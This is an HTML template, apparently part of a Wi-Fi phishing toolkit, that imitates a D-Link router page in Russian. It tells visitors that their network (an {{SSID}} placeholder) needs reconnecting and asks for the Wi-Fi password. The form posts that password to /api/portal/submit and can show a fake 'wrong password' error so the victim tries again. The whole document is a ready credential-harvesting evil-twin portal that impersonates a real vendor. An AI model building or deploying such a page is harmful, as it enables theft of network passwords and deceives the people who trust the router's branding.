<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>D-Link</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#f0f2f5;font-family:Arial,Helvetica,sans-serif;min-height:100vh}
.hdr{background:#0066CC;padding:0 20px;height:52px;display:flex;align-items:center;gap:14px}
.hdr-brand{color:#fff;font-size:21px;font-weight:900;letter-spacing:.5px}
.hdr-dot{width:6px;height:6px;background:#80c0ff;border-radius:50%}
.hdr-sub{color:rgba(255,255,255,.65);font-size:12px}
.banner{background:#0066CC;padding:20px 20px 42px;color:#fff}
.banner h1{font-size:18px;font-weight:700;margin-bottom:6px}
.banner p{font-size:13px;opacity:.88;line-height:1.55}
.ssid-label{font-weight:700}
.wrap{max-width:420px;margin:-20px auto 0;padding:0 16px 36px;position:relative}
.card{background:#fff;border-radius:6px;box-shadow:0 2px 14px rgba(0,0,0,.1);overflow:hidden}
.card-hdr{background:#e6f0fb;padding:10px 18px;font-size:13px;color:#0055aa;font-weight:700;border-bottom:1px solid #d0e4f7}
.card-body{padding:20px 18px}
.field{margin-bottom:14px}
.field label{display:block;font-size:12px;color:#555;margin-bottom:5px;font-weight:600}
input[type=text],input[type=password]{width:100%;padding:10px 12px;border:1px solid #ccd4de;border-radius:4px;font-size:14px;outline:none;-webkit-appearance:none}
input[type=text]:focus,input[type=password]:focus{border-color:#0066CC;box-shadow:0 0 0 2px rgba(0,102,204,.1)}
input[readonly]{background:#f5f7fa;color:#888}
.btn{width:100%;padding:12px;background:#0066CC;color:#fff;border:none;border-radius:4px;font-size:14px;font-weight:700;cursor:pointer;margin-top:4px;-webkit-appearance:none;position:relative}
.btn:active{background:#0052a3}
.spin{display:none;position:absolute;right:14px;top:50%;transform:translateY(-50%);width:16px;height:16px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:sp .7s linear infinite}
@keyframes sp{to{transform:translateY(-50%) rotate(360deg)}}
.error{display:none;background:#fff0f0;border:1px solid #fcc;border-radius:4px;padding:9px 12px;font-size:12px;color:#c0392b;margin-top:9px}
.footer{text-align:center;margin-top:14px;font-size:11px;color:#bbb}
</style>
</head>
<body>
<div class="hdr">
  <span class="hdr-brand">D-Link</span>
  <div class="hdr-dot"></div>
  <span class="hdr-sub">Wi-Fi Router</span>
</div>
<div class="banner">
  <h1>D-Link Wi-Fi</h1>
  <p>Сеть <span class="ssid-label">{{SSID}}</span> требует повторного подключения.<br>Введите пароль для восстановления доступа.</p>
</div>
<div class="wrap">
  <div class="card">
    <div class="card-hdr">Параметры беспроводной сети</div>
    <div class="card-body">
      <form method="POST" action="/api/portal/submit" id="frm">
        <input type="hidden" name="ssid" value="{{SSID}}">
        <input type="hidden" name="vendor" value="dlink">
        <div class="field">
          <label>Имя сети (SSID)</label>
          <input type="text" value="{{SSID}}" readonly>
        </div>
        <div class="field">
          <label>Пароль</label>
          <input type="password" name="password" placeholder="Введите пароль Wi-Fi" required autocomplete="off" minlength="8">
        </div>
        <button type="submit" class="btn" id="sbtn">
          Сохранить и подключить
          <div class="spin" id="sp"></div>
        </button>
      </form>
      <div class="error" id="err">Неверный пароль. Попробуйте ещё раз.</div>
    </div>
  </div>
  <div class="footer">D-Link Corporation</div>
</div>
<script>
document.getElementById('frm').addEventListener('submit',function(){
  document.getElementById('sp').style.display='block';
  document.getElementById('sbtn').disabled=true;
});
if(new URLSearchParams(location.search).get('err')){document.getElementById('err').style.display='block';}
</script>
</body>
</html>
